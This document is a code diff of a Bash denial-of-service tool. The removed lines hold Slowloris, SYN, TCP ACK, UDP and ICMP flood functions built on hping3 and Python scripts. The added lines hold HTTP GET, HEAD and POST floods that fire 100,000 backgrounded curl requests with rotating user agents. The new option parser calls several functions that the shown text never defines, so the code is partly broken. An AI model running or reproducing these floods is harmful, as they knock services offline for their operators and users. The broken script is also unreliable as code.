@@ -1,4 +1,4 @@
-#!/bin/bash
+    #!/bin/bash
 
 # Color definitions
 RED="\e[31m"
@@ -72,165 +72,75 @@ scan_ports() {
     fi
 }
 
-# Non-root attacks
+# Load user-agent list from a file
+load_user_agents() {
+    local file="user_agents.txt"
+    local count=0
+    user_agents=()
+    while IFS= read -r line; do
+        user_agents+=("$line")
+        ((count++))
+        if ((count >= 100000)); then
+            break
+        fi
+    done < "$file"
+}
+
+# Function to get a random user-agent from the loaded list
+get_random_user_agent() {
+    echo "${user_agents[$RANDOM % ${#user_agents[@]}]}"
+}
+
+# Function to send HTTP GET flood
 http_get_flood() {
     target=$1
-    echo -e "${CYAN}[*] Starting HTTP GET flood on $target${RESET}"
-    while true; do
-        curl -s -X GET $target &>/dev/null &
+    echo -e "${CYAN}[*] Starting HTTP GET flood on $target with 100k user agents${RESET}"
+    load_user_agents  # Load 100k user agents
+    for ((i=0; i<100000; i++)); do
+        user_agent=$(get_random_user_agent)  # Get a random user-agent
+        curl -s -X GET $target -A "$user_agent" &>/dev/null &
     done
 }
 
-slowloris_attack() {
-    target=$1
-    packets=10000  # Specify 10k packets for the Slowloris attack
-    echo -e "${CYAN}[*] Starting Slowloris attack with $packets packets on $target${RESET}"
-
-    # Check if pip3 and slowloris are installed
-    if command -v pip3 &> /dev/null && pip3 show slowloris &> /dev/null; then
-        echo -e "${CYAN}[*] Using Slowloris installed via pip3${RESET}"
-        
-        # Get path to slowloris script and ensure it's executable
-        slowloris_installed=$(pip3 show slowloris | grep Location | awk '{print $2}')"/slowloris.py"
-        
-        # Ensure the script exists and is executable
-        if [ -f "$slowloris_installed" ]; then
-            echo -e "${CYAN}[*] Running Slowloris attack...${RESET}"
-            # Fixed: Passing arguments correctly to Slowloris
-            python3 $slowloris_installed -p 80 -s $packets $target
-        else
-            echo -e "${RED}[!] Slowloris not found in pip3 installation directory.${RESET}"
-        fi
-
-    # If Slowloris is cloned via GitHub, use it from the home directory
-    elif [ -d "$HOME/slowloris" ]; then
-        echo -e "${CYAN}[*] Using Slowloris from git clone directory${RESET}"
-        cd "$HOME/slowloris"
-        # Fixed: Corrected Slowloris arguments
-        python3 slowloris.py -p 80 -s $packets $target
-    else
-        echo -e "${RED}[!] Slowloris not installed. Please install using 'pip3 install slowloris' or 'git clone https://github.com/gkbrk/slowloris.git'${RESET}"
-    fi
-}
-
+# Function to send HTTP HEAD flood
 http_head_flood() {
     target=$1
-    echo -e "${CYAN}[*] Starting HTTP HEAD flood on $target${RESET}"
-    while true; do
-        curl -s -X HEAD $target &>/dev/null &
+    echo -e "${CYAN}[*] Starting HTTP HEAD flood on $target with 100k user agents${RESET}"
+    load_user_agents  # Load 100k user agents
+    for ((i=0; i<100000; i++)); do
+        user_agent=$(get_random_user_agent)  # Get a random user-agent
+        curl -s -X HEAD $target -A "$user_agent" &>/dev/null &
     done
 }
 
-# Root-required attacks
-tcp_ack_flood() {
-    target=$1
-    port=$2
-    echo -e "${CYAN}[*] Starting TCP ACK flood on $target:$port (requires root)${RESET}"
-    while true; do
-        sudo hping3 --ack -p $port --flood $target &>/dev/null &
-    done
-}
-
+# Function to send HTTP POST flood
 http_post_flood() {
     target=$1
-    echo -e "${CYAN}[*] Starting HTTP POST flood on $target${RESET}"
-    while true; do
-        curl -s -X POST $target --data "data=payload" &>/dev/null &
+    echo -e "${CYAN}[*] Starting HTTP POST flood on $target with 100k user agents${RESET}"
+    load_user_agents  # Load 100k user agents
+    for ((i=0; i<100000; i++)); do
+        user_agent=$(get_random_user_agent)  # Get a random user-agent
+        curl -s -X POST $target --data "data=payload" -A "$user_agent" &>/dev/null &
     done
 }
 
-# New Root-required attacks
-syn_flood() {
-    target=$1
-    port=$2
-    packets=${3:-10000}
-
-    if [[ $EUID -ne 0 ]]; then
-        echo -e "${RED}[!] SYN flood requires root privileges.${RESET}"
-        exit 1
-    fi
-
-    echo -e "${CYAN}[*] Starting custom TCP SYN flood on $target:$port (requires root)${RESET}"
-    
-    python3 syn_flood.py "$target" "$port" "$packets" &
-}
-
-udp_flood() {
-    target=$1
-    port=$2
-    echo -e "${CYAN}[*] Starting UDP flood on $target:$port (requires root)${RESET}"
-    while true; do
-        sudo hping3 --udp -p $port --flood $target &>/dev/null &
-    done
-}
-
-# ICMP Flood (requires root)
-icmp_flood() {
-    target=$1
-    echo -e "${CYAN}[*] Starting ICMP ping flood on $target (requires root)${RESET}"
-    while true; do
-        sudo hping3 --icmp --flood -p 80 $target &>/dev/null &
-    done
-}
-
-# --- Main Execution Loop ---
-while getopts "u:p:hsrivf:n:H:A:U:W:T:t:Q:P:l" opt; do
-    case $opt in
-        u) target=$OPTARG ;;
-        p) port=$OPTARG ;;
-        h) display_logo; show_help; exit 0 ;;
-        s) scan_ports $target ;;
-        r) retry_attack=true ;;
-        i) attack_type="icmp_flood" ;;
-        S) attack_type="syn_flood" ;;
-        A) attack_type="tcp_ack_flood" ;;
-        U) attack_type="udp_flood" ;;
-        f) spoofed_ip=$OPTARG ;;
-        n) request_count=$OPTARG ;;
-        H) custom_headers=$OPTARG ;;
-        v) verbose=true ;;
-        pSize) packet_size=$OPTARG ;;
-        sFlag) tcp_flag=$OPTARG ;;
-        seq) sequence_number=$OPTARG ;;
-        win) window_size=$OPTARG ;;
-        proto) protocol=$OPTARG ;;
-        P) packet_delay=$OPTARG ;;
-        l) attack_type="slowloris_attack" ;;
-        t) attack_type=$OPTARG ;;
-        \?) show_help; exit 1 ;;
-    esac
-done
-
-# Debug: Print selected options for verification
-if [ "$verbose" = true ]; then
-    echo -e "${YELLOW}[DEBUG] Selected Options:${RESET}"
-    echo -e "  Target: $target"
-    echo -e "  Port: ${port:-80}"
-    echo -e "  Protocol: ${protocol:-TCP}"
-    echo -e "  Packet Size: ${packet_size:-56}"
-    echo -e "  Spoofed IP: ${spoofed_ip:-None}"
-    echo -e "  Custom Headers: ${custom_headers:-None}"
-    echo -e "  Request Count: ${request_count:-1000}"
-    echo -e "  Packet Delay: ${packet_delay:-None}"
-fi
-
-# Execute retry logic if needed
-if [ "$retry_attack" = true ]; then
-    if [ -z "$port" ]; then
-        echo -e "${YELLOW}[!] No port specified, scanning first...${RESET}"
-        scan_ports $target
-    fi
-    echo -e "${GREEN}[+] Retrying attack with found port: $port${RESET}"
-fi
-
-# Attack logic based on attack type
-while true; do
-    case $attack_type in
-        "http_get_flood") http_get_flood $target ;;
-        "slowloris_attack") slowloris_attack $target ;;
-        "syn_flood") syn_flood $target $port ;;
-        "udp_flood") udp_flood $target $port ;;
-        "icmp_flood") icmp_flood $target ;;
-        *) echo -e "${RED}[!] Unknown attack type: $attack_type${RESET}" ;;
+# Main function to handle user input
+while getopts ":u:p:sirSAtf:n:Hvlp:s:seq:win:proto:P:l:t:" option; do
+    case $option in
+        u) target="$OPTARG";;
+        p) port="$OPTARG";;
+        s) scan_ports "$target";;
+        i) http_icmp_flood "$target";;
+        r) retry_attack "$target";;
+        S) syn_flood "$target";;
+        A) ack_flood "$target";;
+        U) udp_flood "$target";;
+        f) spoof_ip "$OPTARG";;
+        n) num_requests="$OPTARG";;
+        H) custom_headers "$OPTARG";;
+        v) verbose=1;;
+        l) slowloris_attack "$target";;
+        t) attack_type="$OPTARG";;
+        *) show_help;;
     esac
 done
